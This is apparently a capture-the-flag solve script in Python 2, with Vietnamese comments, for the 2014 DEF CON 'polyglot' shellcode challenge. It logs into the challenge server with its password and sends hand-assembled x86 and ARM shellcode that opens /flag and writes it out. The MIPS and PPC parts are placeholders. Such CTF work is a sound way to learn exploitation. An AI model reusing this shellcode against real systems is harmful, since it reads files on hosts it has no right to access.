__author__ = 'HuyNA'

'''
polyglot

Just open /flag, and write it to stdout. How hard could it be?

nc polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me 30000

Password: w0rk_tHaT_tAlEnTeD_t0nGu3

dang nhap thi nhan dc string
'Give me shellcode.  You have up to 0x1000 bytes.  All GPRs are 0.  PC is 0x41000000.  SP is 0x42000000.'

sau do nhap string bat ki vao, tuy nhien deu tra ve
'Throwing shellcode against linux26-x86.(http://services.2014.shallweplayaga.me/polyglot_9d64fa98df6ee55e1a5baf0a170d3367)'

sau do doi 1 luc roi thoat voi string
'Didn't send back the right value.  Fail.'
'''

import sys
import os
import socket
import time
import telnetlib
import struct


def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#184.175.99.226 9090
host = "polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me"
local_host="192.168.248.171"
port = 30000
#s.connect((host, port))
#s.connect((local_host, 2323))

s_real = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#184.175.99.226 9090
host = "polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me"
local_host="192.168.248.171"
port = 30000
s_real.connect((host, port))


#sys.stdin.read(1)
'''
shell2.s
'''
#shellcode='\x66\x81\xc4\xc0\x0b\xeb\x32\x5b\xb0\x05\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x31\xd2\xb2\x20\xb9\x00\x04\x00\x42\xcd\x80\x68\x00\x04\x00\x42\xb9\x98\x85\x04\x08\xff\xd1\x59\x68\xa9\xb7\x04\x08\xb9\x98\x85\x04\x08\xff\xd1\x59\xeb\x0a\xe8\xc9\xff\xff\xff\x66\x6c\x61\x67\x00'+'\x90'
shellcode='\x66\x81\xc4\xc0\x0b\xeb\x38\x5b\xb0\x05\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x31\xd2\xb2\x20\xb9\x00\x04\x00\x42\xcd\x80\xb9\x00\x04\x00\x42\xba\x20\x00\x00\x00\xb0\x04\xbb\x01\x00\x00\x00\xcd\x80\x68\xa9\xb7\x04\x08\xb9\x98\x85\x04\x08\xff\xd1\x59\xeb\x0a\xe8\xc3\xff\xff\xff\x66\x6c\x61\x67\x00'+'\x90'
shell   = shellcode + 'a'*(4096-len(shellcode))


shellcode1_thumb = '\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x07\x48\x05\x27\x01\xdf\x20\x22\x06\x49\x03\x27\x01\xdf\x20\x22\x04\x49\x01\x20\x04\x27\x01\xdf\x24\x1b\x20\x1c\x01\x27\x01\xdf\x00\x04\x00\x41\x00\x04\x00\x42'
shellcode1_arm = '\x28\x00\x9f\xe5\x05\x70\xa0\xe3\x00\x00\x00\xef\x20\x20\xa0\xe3\x1c\x10\x9f\xe5\x03\x70\xa0\xe3\x00\x00\x00\xef\x20\x20\xa0\xe3\x0c\x10\x9f\xe5\x01\x00\xa0\xe3\x04\x70\xa0\xe3\x00\x00\x00\xef\x00\x04\x00\x41\x00\x04\x00\x42'
flag = 'flag\x00'
shell1 = shellcode1_arm + 'a'*(0x400-len(shellcode1_arm)) + flag + 'b'*(0xC00-len(flag))

shellcode_mips=''
shellcode_mips+='b'*(0x200-len(shellcode_mips))
shellcode_mips+='flag\x00'
shel_mips = shellcode_mips+'a'*(4096-len(shellcode_mips))

shellcode_ppc=''
shellcode_ppc+='b'*(0x200-len(shellcode_ppc))
shellcode_ppc+='flag\x00'
shel_ppc = shellcode_ppc+'a'*(4096-len(shellcode_ppc))

def test_local():
    global s
    s.send(shell)

    print s.recv(2014)
    print s.recv(2014)
    print s.recv(2014)
#test_local()

def test_real(s):
    print recv_until(s, 'Password: ')
    #print s.recv(2014)
    s.send('w0rk_tHaT_tAlEnTeD_t0nGu3\n')

    print '[+] begin ....'
    print recv_until(s, 'SP is 0x42000000.\n'),
    s.send(shell+shell1+'\n')
    time.sleep(0.001)
    print s.recv(2014)
    time.sleep(0.001)
    s.send(shell1)
    time.sleep(0.001)

    time.sleep(0.001)
    print s.recv(2014)
    time.sleep(0.001)
    s.send(shell1)
    print s.recv(2014)
    print s.recv(2014)

test_real(s_real)
'''
# shellcode = '
38009fe5
0570a0e3
010000ef
2020a0e3
2c109fe5
0370a0e3
010000ef
2020a0e3
1c109fe5
0100a0e3
0470a0e3
010000ef
044044e0
0400a0e1
0170a0e3
010000ef
00040041
00040042'.decode('hex')

'''